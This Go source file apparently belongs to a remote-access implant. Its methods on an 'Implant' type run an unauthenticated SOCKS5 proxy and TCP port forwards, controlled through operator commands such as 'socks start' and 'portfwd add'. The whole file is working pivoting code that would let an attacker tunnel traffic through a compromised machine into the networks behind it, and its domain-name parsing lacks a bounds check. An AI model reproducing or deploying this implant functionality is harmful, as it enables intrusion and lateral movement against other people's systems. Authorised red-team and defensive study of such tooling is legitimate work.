package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"time"
)

// SOCKSProxy manages SOCKS5 proxy functionality
type SOCKSProxy struct {
	Port     int
	Listener net.Listener
	Running  bool
	mu       sync.Mutex
	conns    map[string]net.Conn
}

// PortForward represents a single port forwarding rule
type PortForward struct {
	BindPort    int
	ForwardHost string
	ForwardPort int
	Listener    net.Listener
	Running     bool
}

var (
	socksProxy     *SOCKSProxy
	socksProxyLock sync.Mutex

	portForwards     = make(map[int]*PortForward)
	portForwardsLock sync.Mutex
)

// StartSOCKSProxy starts a SOCKS5 proxy on the specified port
func (i *Implant) StartSOCKSProxy(port int) ([]byte, error) {
	socksProxyLock.Lock()
	defer socksProxyLock.Unlock()

	if socksProxy != nil && socksProxy.Running {
		return nil, fmt.Errorf("SOCKS proxy already running on port %d", socksProxy.Port)
	}

	listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		return nil, fmt.Errorf("failed to start SOCKS proxy: %v", err)
	}

	socksProxy = &SOCKSProxy{
		Port:     port,
		Listener: listener,
		Running:  true,
		conns:    make(map[string]net.Conn),
	}

	go socksProxy.acceptConnections()

	result := map[string]interface{}{
		"status":  "started",
		"port":    port,
		"address": fmt.Sprintf("127.0.0.1:%d", port),
	}
	return json.Marshal(result)
}

// StopSOCKSProxy stops the running SOCKS5 proxy
func (i *Implant) StopSOCKSProxy() ([]byte, error) {
	socksProxyLock.Lock()
	defer socksProxyLock.Unlock()

	if socksProxy == nil || !socksProxy.Running {
		return nil, fmt.Errorf("no SOCKS proxy running")
	}

	socksProxy.Running = false
	socksProxy.Listener.Close()

	// Close all active connections
	socksProxy.mu.Lock()
	for _, conn := range socksProxy.conns {
		conn.Close()
	}
	socksProxy.conns = make(map[string]net.Conn)
	socksProxy.mu.Unlock()

	socksProxy = nil

	result := map[string]interface{}{
		"status": "stopped",
	}
	return json.Marshal(result)
}

// acceptConnections handles incoming SOCKS connections
func (s *SOCKSProxy) acceptConnections() {
	for s.Running {
		conn, err := s.Listener.Accept()
		if err != nil {
			if s.Running {
				continue
			}
			return
		}

		go s.handleConnection(conn)
	}
}

// handleConnection handles a single SOCKS5 connection
func (s *SOCKSProxy) handleConnection(client net.Conn) {
	defer client.Close()

	s.mu.Lock()
	connID := client.RemoteAddr().String()
	s.conns[connID] = client
	s.mu.Unlock()

	defer func() {
		s.mu.Lock()
		delete(s.conns, connID)
		s.mu.Unlock()
	}()

	// SOCKS5 handshake
	buf := make([]byte, 256)
	n, err := client.Read(buf)
	if err != nil || n < 2 {
		return
	}

	// Check SOCKS version
	if buf[0] != 0x05 {
		return
	}

	// Send authentication method: no authentication required
	client.Write([]byte{0x05, 0x00})

	// Read connection request
	n, err = client.Read(buf)
	if err != nil || n < 10 {
		return
	}

	// Parse request
	if buf[0] != 0x05 || buf[1] != 0x01 { // Version 5, CONNECT command
		client.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // Command not supported
		return
	}

	var host string
	var port uint16

	switch buf[3] { // Address type
	case 0x01: // IPv4
		host = net.IPv4(buf[4], buf[5], buf[6], buf[7]).String()
		port = binary.BigEndian.Uint16(buf[8:10])
	case 0x03: // Domain name
		domainLen := int(buf[4])
		host = string(buf[5 : 5+domainLen])
		port = binary.BigEndian.Uint16(buf[5+domainLen : 7+domainLen])
	case 0x04: // IPv6
		host = net.IP(buf[4:20]).String()
		port = binary.BigEndian.Uint16(buf[20:22])
	default:
		client.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // Address type not supported
		return
	}

	// Connect to target
	target, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 10*time.Second)
	if err != nil {
		client.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // Connection refused
		return
	}
	defer target.Close()

	// Send success response
	client.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

	// Relay data between client and target
	go io.Copy(target, client)
	io.Copy(client, target)
}

// AddPortForward adds a port forwarding rule
func (i *Implant) AddPortForward(bindPort int, forwardHost string, forwardPort int) ([]byte, error) {
	portForwardsLock.Lock()
	defer portForwardsLock.Unlock()

	if _, exists := portForwards[bindPort]; exists {
		return nil, fmt.Errorf("port forward already exists on port %d", bindPort)
	}

	listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", bindPort))
	if err != nil {
		return nil, fmt.Errorf("failed to bind port %d: %v", bindPort, err)
	}

	pf := &PortForward{
		BindPort:    bindPort,
		ForwardHost: forwardHost,
		ForwardPort: forwardPort,
		Listener:    listener,
		Running:     true,
	}

	portForwards[bindPort] = pf
	go pf.acceptConnections()

	result := map[string]interface{}{
		"status":       "added",
		"bind_port":    bindPort,
		"forward_host": forwardHost,
		"forward_port": forwardPort,
	}
	return json.Marshal(result)
}

// RemovePortForward removes a port forwarding rule
func (i *Implant) RemovePortForward(bindPort int) ([]byte, error) {
	portForwardsLock.Lock()
	defer portForwardsLock.Unlock()

	pf, exists := portForwards[bindPort]
	if !exists {
		return nil, fmt.Errorf("no port forward on port %d", bindPort)
	}

	pf.Running = false
	pf.Listener.Close()
	delete(portForwards, bindPort)

	result := map[string]interface{}{
		"status":    "removed",
		"bind_port": bindPort,
	}
	return json.Marshal(result)
}

// ListPortForwards lists all active port forwarding rules
func (i *Implant) ListPortForwards() ([]byte, error) {
	portForwardsLock.Lock()
	defer portForwardsLock.Unlock()

	forwards := make([]map[string]interface{}, 0)
	for _, pf := range portForwards {
		forwards = append(forwards, map[string]interface{}{
			"bind_port":    pf.BindPort,
			"forward_host": pf.ForwardHost,
			"forward_port": pf.ForwardPort,
			"running":      pf.Running,
		})
	}

	// Also include SOCKS proxy status
	socksProxyLock.Lock()
	socksStatus := map[string]interface{}{
		"enabled": false,
	}
	if socksProxy != nil && socksProxy.Running {
		socksStatus = map[string]interface{}{
			"enabled": true,
			"port":    socksProxy.Port,
		}
	}
	socksProxyLock.Unlock()

	result := map[string]interface{}{
		"port_forwards": forwards,
		"socks_proxy":   socksStatus,
	}
	return json.Marshal(result)
}

// acceptConnections handles incoming connections for port forwarding
func (pf *PortForward) acceptConnections() {
	for pf.Running {
		client, err := pf.Listener.Accept()
		if err != nil {
			if pf.Running {
				continue
			}
			return
		}

		go pf.handleConnection(client)
	}
}

// handleConnection forwards traffic between client and target
func (pf *PortForward) handleConnection(client net.Conn) {
	defer client.Close()

	target, err := net.DialTimeout("tcp",
		fmt.Sprintf("%s:%d", pf.ForwardHost, pf.ForwardPort),
		10*time.Second)
	if err != nil {
		return
	}
	defer target.Close()

	// Relay data bidirectionally
	done := make(chan bool, 2)

	go func() {
		io.Copy(target, client)
		done <- true
	}()

	go func() {
		io.Copy(client, target)
		done <- true
	}()

	<-done
}

// HandleSOCKSCommand handles SOCKS-related commands
func (i *Implant) HandleSOCKSCommand(cmd string, args []string) ([]byte, error) {
	switch cmd {
	case "start":
		if len(args) < 1 {
			return nil, fmt.Errorf("usage: socks start <port>")
		}
		port, err := strconv.Atoi(args[0])
		if err != nil {
			return nil, fmt.Errorf("invalid port: %v", err)
		}
		return i.StartSOCKSProxy(port)
	case "stop":
		return i.StopSOCKSProxy()
	default:
		return nil, fmt.Errorf("unknown SOCKS command: %s", cmd)
	}
}

// HandlePortForwardCommand handles port forwarding commands
func (i *Implant) HandlePortForwardCommand(cmd string, args []string) ([]byte, error) {
	switch cmd {
	case "add":
		if len(args) < 3 {
			return nil, fmt.Errorf("usage: portfwd add <bind_port> <forward_host> <forward_port>")
		}
		bindPort, err := strconv.Atoi(args[0])
		if err != nil {
			return nil, fmt.Errorf("invalid bind port: %v", err)
		}
		forwardPort, err := strconv.Atoi(args[2])
		if err != nil {
			return nil, fmt.Errorf("invalid forward port: %v", err)
		}
		return i.AddPortForward(bindPort, args[1], forwardPort)
	case "remove":
		if len(args) < 1 {
			return nil, fmt.Errorf("usage: portfwd remove <bind_port>")
		}
		bindPort, err := strconv.Atoi(args[0])
		if err != nil {
			return nil, fmt.Errorf("invalid bind port: %v", err)
		}
		return i.RemovePortForward(bindPort)
	case "list":
		return i.ListPortForwards()
	default:
		return nil, fmt.Errorf("unknown portfwd command: %s", cmd)
	}
}
